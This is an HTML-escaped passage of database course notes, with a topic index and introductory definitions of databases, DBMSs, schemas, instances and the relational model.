        &lt;li&gt;&lt;a href=&#34;#disadvantages-with-file-processing-systems&#34;&gt;Disadvantages with File-Processing Systems&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#databases&#34;&gt;Databases&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#database-definition&#34;&gt;Database Definition&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#database-management-system-dbms&#34;&gt;Database Management System (DBMS)&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#scheme-definition&#34;&gt;Scheme Definition&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#database-instance-definition&#34;&gt;Database Instance Definition&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#levels&#34;&gt;Levels&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#the-relational-model&#34;&gt;The Relational Model&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#data-model&#34;&gt;Data Model&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#schema-and-instance&#34;&gt;Schema and Instance&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#integrity-constraints&#34;&gt;Integrity Constraints&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#the-relational-algebra&#34;&gt;The Relational Algebra&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#operators&#34;&gt;Operators&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#selection&#34;&gt;Selection&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#projection&#34;&gt;Projection&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#cross-product&#34;&gt;Cross Product&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#conditional-join&#34;&gt;Conditional Join&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#natural-join&#34;&gt;Natural Join&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#set-based-relational-operators&#34;&gt;Set-Based Relational Operators&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#summary-of-relational-operators&#34;&gt;Summary of Relational Operators&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#finding-the-maximums-of-a-relation&#34;&gt;Finding the maximums of a relation&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#algebraic-equivalences&#34;&gt;Algebraic Equivalences&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#relational-completeness&#34;&gt;Relational Completeness&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#the-relational-calculus&#34;&gt;The Relational Calculus&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#sql---structured-query-language&#34;&gt;SQL - Structured Query Language&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#schema-used-for-examples&#34;&gt;Schema Used for Examples&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#data-types&#34;&gt;Data Types&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#tables&#34;&gt;Tables&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#queries&#34;&gt;Queries&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#subqueries&#34;&gt;Subqueries&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#data-modifications&#34;&gt;Data Modifications&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#sql-intermediate-topics&#34;&gt;SQL Intermediate Topics&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#check-constraints&#34;&gt;Check Constraints&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#foreign-key-contraints&#34;&gt;Foreign Key Contraints&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#deleting-in-referenced-relation&#34;&gt;Deleting in Referenced Relation&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#views&#34;&gt;Views&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#access-control&#34;&gt;Access Control&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#indexes&#34;&gt;Indexes&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#sql-relational-division&#34;&gt;SQL Relational Division&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#sql-drivers&#34;&gt;SQL Drivers&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#prepared-statements&#34;&gt;Prepared Statements&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#metadata-features&#34;&gt;Metadata Features&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#functions-and-procedures&#34;&gt;Functions and Procedures&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#triggers&#34;&gt;Triggers&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#ranking&#34;&gt;Ranking&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#windowing-moving&#34;&gt;Windowing (Moving)&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#pivoting&#34;&gt;Pivoting&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#rollup-and-cube&#34;&gt;Rollup and Cube&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#recursion&#34;&gt;Recursion&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#entity-relationship-model&#34;&gt;Entity-Relationship Model&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#database-design&#34;&gt;Database Design&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#complex-attributes&#34;&gt;Complex Attributes&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#mapping-cardinality&#34;&gt;Mapping Cardinality&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#primary-keys-in-e-r-model&#34;&gt;Primary Keys in E-R Model&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#removing-redundant-attributes-in-entity-sets&#34;&gt;Removing Redundant Attributes in Entity Sets&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#specialization&#34;&gt;Specialization&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#common-mistakes&#34;&gt;Common Mistakes&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#e-r-diagram-to-relational-tables&#34;&gt;E-R Diagram to Relational Tables&lt;/a&gt;&lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#schema-refinement-dependencies&#34;&gt;Schema Refinement: Dependencies&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#example&#34;&gt;Example&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#single-table-schema&#34;&gt;Single-Table Schema&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#too-many-tables&#34;&gt;Too many Tables&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#functional-dependencies-armstrongs-axioms&#34;&gt;Functional Dependencies: Armstrong&amp;rsquo;s Axioms&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#function-dependencies-attribute-closure&#34;&gt;Function Dependencies: Attribute Closure&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#schema-decomposition&#34;&gt;Schema Decomposition&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#transactions&#34;&gt;Transactions&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#transaction&#34;&gt;Transaction&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#execution-history&#34;&gt;Execution History&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#serial-execution-histories&#34;&gt;Serial Execution HIstories&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#sql-isolation-levels&#34;&gt;SQL Isolation Levels&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#indexing&#34;&gt;Indexing&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#index-structure&#34;&gt;Index Structure&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#transaction-processing&#34;&gt;Transaction Processing&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#concurrency-control---isolation&#34;&gt;Concurrency Control - Isolation&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#two-phase-locking&#34;&gt;Two-Phase Locking&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#recovery---atomicity-and-durability&#34;&gt;Recovery - Atomicity and Durability&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#logging&#34;&gt;Logging&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#data-analytics-warehousing-and-mining&#34;&gt;Data Analytics: Warehousing and Mining&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#online-transactional-processing-oltp&#34;&gt;Online Transactional Processing (OLTP)&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#data-analytics&#34;&gt;Data Analytics&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#data-warehouses&#34;&gt;Data Warehouses&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#big-data&#34;&gt;Big Data&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#mapreduce&#34;&gt;MapReduce&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#hadoop&#34;&gt;Hadoop&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#apache-spark&#34;&gt;Apache Spark&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;a href=&#34;#nosql-systems&#34;&gt;NoSQL Systems&lt;/a&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;a href=&#34;#cap-theorem&#34;&gt;CAP Theorem&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#key-value-stores&#34;&gt;Key-Value Stores&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#amazon-dynamodb&#34;&gt;Amazon DynamoDB&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#mongodb&#34;&gt;MongoDB&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#google-bigtable&#34;&gt;Google BigTable&lt;/a&gt;&lt;/li&gt;
        &lt;li&gt;&lt;a href=&#34;#graph-dbmss&#34;&gt;Graph DBMSs&lt;/a&gt;&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/nav&gt;
&lt;/div&gt;

&lt;h2 id=&#34;objectives&#34; &gt;Objectives
&lt;span&gt;
    &lt;a href=&#34;#objectives&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;viewpoints&#34; &gt;Viewpoints
&lt;span&gt;
    &lt;a href=&#34;#viewpoints&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;database user&lt;/li&gt;
&lt;li&gt;database designer&lt;/li&gt;
&lt;li&gt;database manager&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;sub-objectives&#34; &gt;Sub-objectives
&lt;span&gt;
    &lt;a href=&#34;#sub-objectives&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;SQL&lt;/li&gt;
&lt;li&gt;data modeling&lt;/li&gt;
&lt;li&gt;management&lt;/li&gt;
&lt;li&gt;database management system (DBMS)&lt;/li&gt;
&lt;li&gt;Relational model&lt;/li&gt;
&lt;li&gt;Application programming&lt;/li&gt;
&lt;li&gt;Transaction and concurrency&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;file-processing-systems&#34; &gt;File-Processing Systems
&lt;span&gt;
    &lt;a href=&#34;#file-processing-systems&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;disadvantages-with-file-processing-systems&#34; &gt;Disadvantages with File-Processing Systems
&lt;span&gt;
    &lt;a href=&#34;#disadvantages-with-file-processing-systems&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Data redundancy and inconsistency
&lt;ul&gt;
&lt;li&gt;various copies leads to higher storage&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Difficulty in accessing or modifying data&lt;/li&gt;
&lt;li&gt;Integritty problems
&lt;ul&gt;
&lt;li&gt;New constraints require changing the program&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Atomicity problem
&lt;ul&gt;
&lt;li&gt;Difficult to ensure atomic property and to restore state after failure&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Concurrency issues&lt;/li&gt;
&lt;li&gt;Security&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;databases&#34; &gt;Databases
&lt;span&gt;
    &lt;a href=&#34;#databases&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;database-definition&#34; &gt;Database Definition
&lt;span&gt;
    &lt;a href=&#34;#database-definition&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;A large and persistent collection of (more-or-less similar) pieces of
information organized in a way that facilitates efficient retrieval and
modification.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;database-management-system-dbms&#34; &gt;Database Management System (DBMS)
&lt;span&gt;
    &lt;a href=&#34;#database-management-system-dbms&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;A program (or set of programs) that manages details related to storage and
access for a database.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Data model&lt;/li&gt;
&lt;li&gt;Access control&lt;/li&gt;
&lt;li&gt;Concurrency control&lt;/li&gt;
&lt;li&gt;Database recovery&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;scheme-definition&#34; &gt;Scheme Definition
&lt;span&gt;
    &lt;a href=&#34;#scheme-definition&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;A schema is a description of the data interface to the database&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;database-instance-definition&#34; &gt;Database Instance Definition
&lt;span&gt;
    &lt;a href=&#34;#database-instance-definition&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;A database instance is a database (real data) that conforms to a given schema
) i.e., the information stored in the database at a particular moment&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;levels&#34; &gt;Levels
&lt;span&gt;
    &lt;a href=&#34;#levels&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Physical&lt;/li&gt;
&lt;li&gt;Virtual&lt;/li&gt;
&lt;li&gt;External&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;the-relational-model&#34; &gt;The Relational Model
&lt;span&gt;
    &lt;a href=&#34;#the-relational-model&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;A database is a collection of relations (tables). Each relation
has a set of attributes (columns). Each attribute has a name and an atomic (indivisible) domain (type). Each relation has a set of tuples (rows).
Duplicate tuples are not allowed. Two tuples are duplicates if all their attributes agree.&lt;/p&gt;
&lt;h3 id=&#34;data-model&#34; &gt;Data Model
&lt;span&gt;
    &lt;a href=&#34;#data-model&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;structure&lt;/li&gt;
&lt;li&gt;operations&lt;/li&gt;
&lt;li&gt;constraints&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;schema-and-instance&#34; &gt;Schema and Instance
&lt;span&gt;
    &lt;a href=&#34;#schema-and-instance&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-schema&#34; data-lang=&#34;schema&#34;&gt;author(aid:int, name:string)
publication(pubid:int, title:string)
journal(pubid, volume)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A database can be displayed tabularly with a table for each relation.1&lt;/p&gt;
&lt;h3 id=&#34;integrity-constraints&#34; &gt;Integrity Constraints
&lt;span&gt;
    &lt;a href=&#34;#integrity-constraints&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
